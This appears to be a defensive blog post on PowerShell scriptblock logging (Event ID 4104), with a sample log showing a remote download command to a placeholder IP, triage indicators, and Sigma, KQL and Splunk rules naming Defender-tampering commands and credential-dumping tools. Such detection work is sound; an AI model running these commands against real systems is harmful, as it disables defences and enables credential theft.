---
title: "PowerShell Event ID 4104 explained: scriptblock logging for DFIR"
description: "Scriptblock logging is Windows' most useful free defensive control. It records the full script body — including obfuscated or in-memory ones — under event 4104."
date: "2026-05-17"
---

When PowerShell scriptblock logging is enabled, the engine records the body of every script that executes — interactive commands, scripts loaded from disk, and anything reflected into memory by `Invoke-Expression` or `IEX`. The record lands on the channel `Microsoft-Windows-PowerShell/Operational` as event ID **4104**, "Creating Scriptblock text".

## What you get

```xml
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.5/a')</Data>
<Data Name="ScriptBlockId">{guid}</Data>
<Data Name="Path">C:\Users\alice\Downloads\setup.ps1</Data>
```

For a long script PowerShell splits it across multiple 4104 records (one per message number). Joining them back together is essential — fragments are easy to misread.

## How to turn it on

The setting is `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`, equivalent to the Group Policy at *Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging*. There is no Powershell-side cost worth measuring — turn it on everywhere.

## What it catches that nothing else does

The PowerShell engine logs the script **after** any encoding, compression, or in-memory reflection. That means:

- A `-EncodedCommand` invocation logs both the encoded launcher (in the corresponding ProcessCreate / 4688) and the decoded body (in 4104).
- A script that downloads and `Invoke-Expression`'s a remote payload logs the *executed* body, not the wrapper.
- An attacker using AMSI bypasses still leaves the 4104 record — the bypass affects scanning, not logging.

This is the single most useful free defensive control on the platform. Defenders who don't have EDR usually do have this.

## Triaging 4104 at scale

The high-signal patterns in a corpus of 4104 records:

- `DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `Net.WebClient` — remote content fetch.
- `IEX`, `Invoke-Expression` — dynamic execution.
- `FromBase64String`, `[System.Convert]::FromBase64String` — encoded payload.
- `Add-MpPreference -ExclusionPath` — Defender tampering.
- `Set-MpPreference -DisableRealtimeMonitoring` — Defender tampering.
- `[System.Reflection.Assembly]::Load`, `[Reflection.Emit]` — in-memory assembly loading.
- `Invoke-Mimikatz`, `Invoke-Kerberoast`, `Invoke-BloodHound` — known offensive tooling.

A single match alone is not always malicious (admins use `DownloadString` too), but the combinations are. Pivot from 4104 to the matching [Sysmon event 1](/en/blog/sysmon-event-id-1-process-create) / 4688 by timestamp + process to recover the full invocation context.

## Sample Sigma rule — offensive PowerShell tooling in scriptblock

```yaml
title: Suspicious PowerShell Scriptblock — Offensive Tool Indicators
id: 4f1a3b8d-2c5e-4d8f-9a3b-1c2d3e4f5a6b
status: stable
description: PowerShell scriptblock body contains strings characteristic of offensive tooling, encoded payloads, or in-memory reflection.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/
logsource:
  product: windows
  service: powershell
  category: ps_script
detection:
  selection_offensive:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Mimikatz'
      - 'Invoke-Kerberoast'
      - 'Invoke-BloodHound'
      - 'Invoke-DCSync'
      - 'New-PSInjection'
      - 'Get-PassHashes'
  selection_reflective:
    EventID: 4104
    ScriptBlockText|contains:
      - 'System.Reflection.Assembly]::Load'
      - '[Reflection.Emit]'
      - 'FromBase64String'
  selection_defender_tamper:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'Set-MpPreference -DisableIOAVProtection'
  condition: selection_offensive or selection_reflective or selection_defender_tamper
falsepositives:
  - Defenders running known offensive tooling for testing (whitelist by host)
  - Software installers using reflection for legitimate purposes
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
```

## Sample KQL — encoded PowerShell from a low-priv user

```kusto
let encoded =
    Event
    | where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
    | extend XmlData = parse_xml(EventData)
    | extend ScriptBlockText = tostring(XmlData.EventData.Data[2])
    | where ScriptBlockText contains "FromBase64String"
       or ScriptBlockText matches regex @"\b-e(?:nc|ncodedcommand)?\b\s"
    | project TimeGenerated, Computer, UserId=tostring(XmlData.System.Security["@UserID"]), ScriptBlockText;
encoded
| where UserId !startswith "S-1-5-18"   // exclude LocalSystem
   and UserId !startswith "S-1-5-19"
   and UserId !startswith "S-1-5-20"
| order by TimeGenerated desc
```

## Sample Splunk — Defender tamper from PowerShell

```spl
index=powershell EventCode=4104
   ( ScriptBlockText="*Set-MpPreference*DisableRealtimeMonitoring*"
     OR ScriptBlockText="*Add-MpPreference*ExclusionPath*"
     OR ScriptBlockText="*Set-MpPreference*DisableIOAVProtection*" )
| table _time host UserID ScriptBlockText
```

## ATT&CK mapping

- **T1059.001 — Command and Scripting Interpreter: PowerShell**: every offensive 4104 maps here. PowerShell is one of the most-cited execution techniques in modern intrusions.
- **T1027 — Obfuscated Files or Information**: encoded / Base64 / `FromBase64String` patterns.
- **T1059.001 + T1140 — Deobfuscate/Decode Files or Information**: the engine logs the *decoded* form, which is the value 4104 provides over [4688](/en/blog/event-id-4688-process-creation).
- **T1562.001 — Impair Defenses: Disable or Modify Tools**: `Set-MpPreference -DisableRealtimeMonitoring`, `Add-MpPreference -ExclusionPath`.
- **T1003.001 — OS Credential Dumping: LSASS Memory**: `Invoke-Mimikatz`, `MiniDump`, `comsvcs.dll` patterns in script bodies.
- **T1558.003 — Kerberoasting**: `Invoke-Kerberoast`, `Rubeus kerberoast` patterns.

## False positives that look exactly like attacks

- **Admin runbooks** sometimes use `Invoke-Expression` legitimately for templated configuration. The combination is usually short, repeatable, and from known admin sessions.
- **Defender management** scripts (corporate IT) call `Set-MpPreference` legitimately to push exclusion lists. Whitelist by the script's signing certificate or host SID.
- **Chocolatey / WinGet / package installers** use Base64-encoded PowerShell legitimately. Pattern: short, daytime, from build/admin hosts.
- **Red-team / pentest** activity will look identical to real attacks. Coordinate engagement windows and tag the operator's source IPs.

## The blind spot

4104 logs the *script* body. It does not log per-statement execution, function returns, or variable values. For that you need transcription (event 4103, "Module logging") or a real EDR. 4104 tells you what ran; the rest tells you what it did.
